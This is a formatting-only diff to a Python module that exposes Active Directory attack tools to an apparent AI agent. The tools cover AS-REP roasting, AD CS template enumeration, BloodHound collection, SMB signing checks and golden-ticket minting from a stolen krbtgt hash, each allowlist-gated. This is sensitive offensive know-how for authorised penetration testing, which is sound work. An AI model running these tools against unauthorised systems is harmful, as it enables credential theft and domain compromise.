@@ -98,7 +98,15 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
     # ── asrep_roast ──────────────────────────────────────────────────────────
     @mcp.tool()
     @require_allowlist()
-    def asrep_roast(target_ip: str, domain: str, username: str = "", password: str = "", ntlm_hash: str = "", dc_ip: str = "", users_file: str = "") -> str:
+    def asrep_roast(
+        target_ip: str,
+        domain: str,
+        username: str = "",
+        password: str = "",
+        ntlm_hash: str = "",
+        dc_ip: str = "",
+        users_file: str = "",
+    ) -> str:
         """AS-REP Roast: request AS-REPs for accounts with 'Do not require Kerberos preauthentication' (impacket-GetNPUsers) and emit hashcat-mode-18200 hashes for offline cracking. Provide a domain and either credentials or a users_file. dc_ip defaults to target_ip (the DC); an off-target DC is allowlist-gated."""
         if not _ad_enabled(config, "asrep_roast"):
             return "BLOCKED: asrep_roast disabled (exploit.ad_kerberos.enabled / asrep_roast)."
@@ -124,7 +132,9 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
             if not (username or "").strip():
                 return "BLOCKED: username (or users_file) is required for asrep_roast."
             if not ((password or "").strip() or (ntlm_hash or "").strip()):
-                return "BLOCKED: either password or ntlm_hash must be provided (or pass users_file for anonymous probing)."
+                return (
+                    "BLOCKED: either password or ntlm_hash must be provided (or pass users_file for anonymous probing)."
+                )
             argv.append(_auth_target(domain, username, password, ntlm_hash, dc))
         else:
             argv.append((domain or "").strip())
@@ -184,7 +194,9 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
     # ── adcs_enum ─────────────────────────────────────────────────────────────
     @mcp.tool()
     @require_allowlist()
-    def adcs_enum(target_ip: str, username: str, password: str = "", ntlm_hash: str = "", domain: str = "", dc_ip: str = "") -> str:
+    def adcs_enum(
+        target_ip: str, username: str, password: str = "", ntlm_hash: str = "", domain: str = "", dc_ip: str = ""
+    ) -> str:
         """Enumerate Active Directory Certificate Services (AD CS) templates via certipy (ESC1-8). Provide username + domain + (password or ntlm_hash). dc_ip defaults to target_ip; an off-target DC is allowlist-gated. Returns vulnerable-template summary for privesc/credential-theft planning."""
         if not _ad_enabled(config, "adcs_enum"):
             return "BLOCKED: adcs_enum disabled (exploit.ad_kerberos.enabled / adcs_enum)."
@@ -221,7 +233,9 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
     # ── bloodhound_collect ────────────────────────────────────────────────────
     @mcp.tool()
     @require_allowlist()
-    def bloodhound_collect(target_ip: str, domain: str, username: str, password: str = "", ntlm_hash: str = "", dc_ip: str = "") -> str:
+    def bloodhound_collect(
+        target_ip: str, domain: str, username: str, password: str = "", ntlm_hash: str = "", dc_ip: str = ""
+    ) -> str:
         """Collect BloodHound data (users/groups/sessions/acls) via bloodhound-python -c All --zip for graph-based attack-path analysis. Provide domain + credentials. dc_ip defaults to target_ip (the DC); off-target DC is allowlist-gated. Zipped JSON lands in the per-target workspace."""
         if not _ad_enabled(config, "bloodhound"):
             return "BLOCKED: bloodhound disabled (exploit.ad_kerberos.enabled / bloodhound)."
@@ -314,17 +328,14 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
             nmap_bin = shutil.which("nmap") or "nmap"
             argv = [nmap_bin, "--script", "smb2-security-mode", "-p", "445", target_ip]
         status, rc, output = _run(argv, 120)
-        return (
-            f"SMB_SIGNING_CHECK_RESULT: {status}\n"
-            f"ATTEMPT_ID: {attempt_id}\n"
-            f"TARGET: {target_ip}\n"
-            f"OUTPUT:\n{output}"
-        )
+        return f"SMB_SIGNING_CHECK_RESULT: {status}\nATTEMPT_ID: {attempt_id}\nTARGET: {target_ip}\nOUTPUT:\n{output}"
 
     # ── golden_ticket ─────────────────────────────────────────────────────────
     @mcp.tool()
     @require_allowlist()
-    def golden_ticket(target_ip: str, domain: str, username: str, krbtgt_hash: str, sid: str = "", duration: str = "10d") -> str:
+    def golden_ticket(
+        target_ip: str, domain: str, username: str, krbtgt_hash: str, sid: str = "", duration: str = "10d"
+    ) -> str:
         """Mint a Kerberos golden ticket (TGT) from a stolen krbtgt NTLM hash via impacket-ticketer. Provide the domain, target user, krbtgt hash (32-hex NT), domain SID, and ticket duration. The ticket is written to the workspace; export KRB5CCNAME to use it with impacket tools against the owned target only."""
         if not _ad_enabled(config, "golden_ticket"):
             return "BLOCKED: golden_ticket disabled (exploit.ad_kerberos.enabled / golden_ticket)."
@@ -342,9 +353,17 @@ def register_ad_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ccache = attempt_dir / f"{username.strip()}.ccache"
         ticketer = shutil.which("impacket-ticketer") or "impacket-ticketer"
         argv = [
-            ticketer, "-nthash", h, "-domain", domain.strip(),
-            "-domain-sid", sid.strip(), "-user", username.strip(),
-            "-duration", (duration or "10d").strip(),
+            ticketer,
+            "-nthash",
+            h,
+            "-domain",
+            domain.strip(),
+            "-domain-sid",
+            sid.strip(),
+            "-user",
+            username.strip(),
+            "-duration",
+            (duration or "10d").strip(),
         ]
         # impacket-ticketer writes <user>.ccache in CWD; set the explicit output via env.
         argv.append(username.strip())
